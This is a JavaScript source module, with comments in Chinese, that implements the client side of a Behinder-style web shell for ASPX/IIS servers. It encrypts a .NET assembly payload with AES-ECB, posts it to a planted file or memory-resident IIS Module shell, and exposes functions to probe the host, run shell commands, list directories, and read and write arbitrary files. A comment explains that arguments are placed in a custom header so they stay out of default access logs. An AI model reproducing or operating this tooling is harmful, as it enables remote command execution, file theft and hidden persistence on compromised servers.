// 冰蝎型 ASPX 通道（behinder-aspx，AES-ECB + .NET 程序集管线）：
//   密钥 key = md5(连接密码)[0:16]；请求体 = 原始 AES-128-ECB 密文（U.dll 字节，无 base64）
//   马侧契约（冰蝎型 ASPX 文件马与 IIS Module 内存马通用）：BinaryRead → AES 解密 →
//   Assembly.Load → CreateInstance("U") → Equals(Page)。
// 实现策略：单程序集多操作（payload-src/csharp/U.cs，mcs 编译嵌入）——程序集字节固定，
// 实参走 X-W-P 头（k=b64;k=b64——自定义头不进默认访问日志），免程序集补丁。
// 连接对象：冰蝎型 ASPX 文件马 / ashx / IIS Module 型内存马。

import { createCipheriv } from "node:crypto";
import { httpRequest, b64, md5hex } from "./http-client.js";
import { ASPX_PAYLOADS } from "./payloads-aspx.js";
import { shapeHeaders, stripResponse } from "./profile.js";

const keyOf = (conn) => md5hex(String(conn.password ?? "")).slice(0, 16);

function enc(key, plain) {
	const c = createCipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([c.update(plain), c.final()]);
}

/** 写入分块（X-W-P 头长度友好值：b64 后约 43K 字符）。 */
const WRITE_CHUNK_RAW = 32000;

/**
 * 发送载荷程序集 + 头驱动操作。
 * @param op probe/cmd/ls/read/write
 * @param params {参数名: 值}（自动 b64 进 X-W-P 头）
 */
export async function sendAsm(conn, op, params = {}) {
	const parts = ["o=" + b64(op)];
	for (const [k, v] of Object.entries(params)) {
		if (v === undefined || v === null) continue;
		parts.push(k + "=" + b64(String(v)));
	}
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: shapeHeaders(conn, { "content-type": "application/octet-stream", "X-W-P": parts.join(";"), ...(conn.headers ?? {}) }),
		body: enc(keyOf(conn), Buffer.from(ASPX_PAYLOADS.U, "base64")),
		timeoutMs: conn.timeoutMs
	});
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}——密码不符或马不存在）`);
	const text = stripResponse(conn, res.bodyBuffer.toString("utf8")).trim();
	if (text.startsWith("!ERR")) throw new Error(`载荷执行失败：${text.slice(4).trim()}`);
	return text;
}

export async function runCommand(conn, command, cwd = "") {
	return sendAsm(conn, "cmd", { c: command, d: cwd });
}

/** probe 结构化信息：WSM1|token|os|user|home|cwd|clrver|cpus|appRoot。 */
export async function fetchInfo(conn) {
	const token = "WSMA" + Math.random().toString(36).slice(2, 10).toUpperCase();
	const out = await sendAsm({ ...conn, timeoutMs: Math.min(conn.timeoutMs || 8000, 8000) }, "probe", { t: token });
	if (!out.startsWith("WSM1|" + token)) return null;
	const f = out.split("|");
	return { token, osName: f[2] ?? "", user: f[3] ?? "", home: f[4] ?? "", userDir: f[5] ?? "", clr: f[6] ?? "", cpus: f[7] ?? "", realPath: f[8] ?? "" };
}

export async function listDir(conn, path) {
	return JSON.parse(await sendAsm(conn, "ls", { p: path }));
}

export async function readFile(conn, path) {
	return Buffer.from(await sendAsm(conn, "read", { p: path }), "base64");
}

export async function writeFile(conn, path, data) {
	const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
	let off = 0, first = true;
	do {
		const r = await sendAsm(conn, "write", {
			p: path,
			b: buf.subarray(off, off + WRITE_CHUNK_RAW).toString("base64"),
			m: first ? "w" : "a"
		});
		if (!r.startsWith("OK")) throw new Error(`马侧写入失败：${r}`);
		off += WRITE_CHUNK_RAW;
		first = false;
	} while (off < buf.length);
	return { ok: true, size: buf.length };
}

const probeToken = () => "WSMA" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const info = await fetchInfo(conn);
		return info ? { tokenOutput: "WSM1", basicInfo: info } : null;
	} catch {
		return null;
	}
}

export const behinderAspxCodec = {
	id: "behinder-aspx",
	label: "冰蝎型通道（ASPX·AES-ECB·程序集载荷）",
	langs: ["aspx"],
	caps: { cmd: true, code: false, b64rw: true },
	sendAsm
};
